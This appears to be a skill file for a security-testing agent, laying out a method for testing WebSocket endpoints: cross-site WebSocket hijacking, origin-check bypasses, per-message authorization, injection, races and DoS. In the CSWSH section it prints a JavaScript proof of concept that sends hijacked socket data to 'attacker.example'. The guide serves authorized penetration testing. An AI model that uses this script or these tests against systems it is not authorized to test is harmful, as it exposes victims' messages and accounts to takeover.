---
name: websocket
description: WebSocket security testing covering handshake auth, origin checks, cross-site WebSocket hijacking, message-level injection, and race conditions
---

# WebSockets

WebSockets upgrade an HTTP connection to a persistent, bidirectional channel. The upgrade handshake is plain HTTP, but once the tunnel is open the usual request/response framing is gone - which makes authentication, authorization, and input validation easy to get wrong. The two highest-yield bugs are cross-site WebSocket hijacking (CSWSH), where a foreign page opens a socket with the victim's cookies, and per-message authorization gaps, where the handshake is checked but individual messages are not.

## Attack Surface

- Chat, notifications, live dashboards, collaborative editing, trading, gaming, and streaming UIs
- Endpoint patterns: `/ws`, `/websocket`, `/socket.io`, `/sockjs`, `/graphql` subscriptions, `/realtime`, `/events`
- Transports: native WebSocket, Socket.IO (with long-polling fallback), SockJS, Phoenix Channels, SignalR, gRPC-Web-ish bidi channels
- Authentication: cookie at handshake, token in URL/query, token in `Sec-WebSocket-Protocol` subprotocol, token per-message
- Load balancers/proxies that terminate WebSocket upgrades (Nginx, HAProxy, envoy, Cloudflare)

## Reconnaissance

1. **Find the endpoints** - mine JS bundles (JS-Snooper/jsniper), watch network traffic via agent-browser/caido, grep for `new WebSocket(` / `ws://` / `wss://`, check `socket.io`/`sockjs` prefixes
2. **Capture the handshake** - method, `Upgrade: websocket`, `Sec-WebSocket-Key`, `Origin`, cookies, headers; note what auth material is present
3. **Test the upgrade response** - does the server echo `Sec-WebSocket-Protocol`? Which subprotocols does it accept?
4. **Map message types** - connect with the real client, capture 5-10 message flows, and identify JSON/Protobuf/binary schemas per message type
5. **Check TLS** - `ws://` (plaintext) vs `wss://`; a plaintext upgrade means tokens/frames are sniffable

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

If the handshake authenticates with cookies and the server does not validate `Origin`, an attacker page can open a socket as the victim:

```
<script>
ws = new WebSocket("wss://target/ws");
ws.onopen = () => ws.send(JSON.stringify({type:"get_messages"}));
ws.onmessage = (e) => new Image().src = "https://attacker.example/?d=" + encodeURIComponent(e.data);
</script>
```

Evidence checklist: victim cookie auth + missing/weak `Origin` check + sensitive data or state-changing messages on the socket.

### Handshake-Only Authentication

The connection authenticates once at upgrade, then every message is trusted. Bugs that follow:

- **User isolation failure**: one user can request another user's channel/room by ID (IDOR over the socket)
- **Privilege re-check missing**: admin operations exposed to user-level sockets
- **Reconnect confusion**: after token rotation/logout, the old socket stays alive

### Token Leakage

- Tokens in the URL (`wss://host/socket?token=...`) leak via logs, referrers, and history
- Tokens in `Sec-WebSocket-Protocol` are visible to intermediaries and reusable cross-origin without cookies

### Message-Level Injection

- JSON values reaching the same sinks as HTTP params: SQL/NoSQL injection, XSS in chat rendering, command injection in "run" message types, path traversal in file-transfer messages
- Protobuf/binary frames with weak validation (see `grpc` skill for field abuse patterns)
- GraphQL subscriptions carrying arbitrary query/mutation payloads - test as a full GraphQL endpoint (see `graphql` skill)

### Origin Check Bypasses

- `Origin` validated by prefix/substring instead of exact match
- `Origin: null` accepted (sandboxed iframes)
- No `Origin` header at all accepted (non-browser clients, curl, native apps)
- CORS-style allowlist mistakes (subdomain confusion, trailing-dot, port-ignoring)

### Race Conditions and State Abuse

- Concurrent state-changing messages (double-spend, redeem-twice, stock oversell) - pair with `race_conditions` skill
- Ordering/timing abuse in collaborative state (last-write-wins on shared resources)

### Protocol/Transport Attacks

- HTTP request smuggling into an upgrade (proxies that mishandle `Upgrade` + `Content-Length`)
- Subprotocol confusion: server echoes a client-requested subprotocol and switches behavior (e.g., debug protocol)
- Ping/pong floods, huge frames, or endless messages -> resource exhaustion DoS
- Downgrade to `ws://` on mixed-content pages (cookie/token sniffing)

## Advanced Techniques

- **Authz matrix over messages**: for each message type, replay with another user's context IDs and a lower-privilege token
- **Replay**: capture a signed message (e.g., trade order) and replay it - is it idempotent?
- **Rate limits**: many socket actions bypass HTTP rate limiting entirely
- **Cross-protocol pivots**: socket messages that trigger HTTP/webhook/email actions -> SSRF or stored XSS in another channel
- **Connection takeover**: after session fixation/logout, check whether an attacker-controlled reconnect can adopt the old session

## Testing Methodology

1. Discover and capture the handshake and message schemas
2. Baseline: connect with a valid session, note auth model (cookie vs token vs per-message)
3. CSWSH: build a cross-origin page, connect with victim cookies, attempt a sensitive read/write
4. Origin matrix: valid origin, evil origin, `null`, no header, subdomain variants
5. Message authz: replay each message type across users/roles and object IDs
6. Injection: fuzz every user-controlled field per message type
7. Transport: TLS check, subprotocol abuse, frame-size/message-rate limits
8. Concurrency: parallel sends for state-changing messages

## Validation

1. For CSWSH: show the attacker page's socket receiving victim data or performing a state change with victim cookies
2. For authz gaps: same message, different user context, unauthorized success (two-account proof)
3. For injection: reproduce with the same evidence standards as the equivalent HTTP class (SQLi, XSS, etc.)
4. Capture the exact handshake request/response and the offending frames

## False Positives

- Origin validated exactly (attacker page rejected at upgrade)
- Token-per-message auth with per-user signing (replay and impersonation fail)
- CSWSH blocked by SameSite/credentials handling (browser refuses to attach cookies cross-site)
- Socket is internal-only or requires mTLS; not reachable from the tested position
- "Race" explained by server-side serialization (no observable state corruption)

## Impact

- Account takeover via CSWSH (read chats, send messages, trigger actions as the victim)
- Cross-user data access via broken channel/room isolation
- RCE/data loss via injection in message fields
- Availability impact via socket DoS

## Pro Tips

1. CSWSH is the first test: victim-cookie auth + missing Origin check is instant account takeover
2. Treat each message type as an endpoint: build the authz matrix and fuzz inputs per type
3. Watch for tokens in URLs and subprotocols - they are the "log leakage" of the WebSocket world
4. Python's `websockets` library and the agent-browser devtools are the fastest way to script message flows in the sandbox
5. Test reconnect/rotation behavior - sockets often outlive the session that created them
6. Check the gateway: proxies that terminate WebSockets may also break framing in interesting ways

## Summary

WebSockets keep HTTP semantics at the handshake and lose them in the tunnel. Verify Origin checks for CSWSH, test authentication per message rather than per connection, fuzz every message field like an HTTP parameter, and check replay/race/rate behavior on state-changing frames.
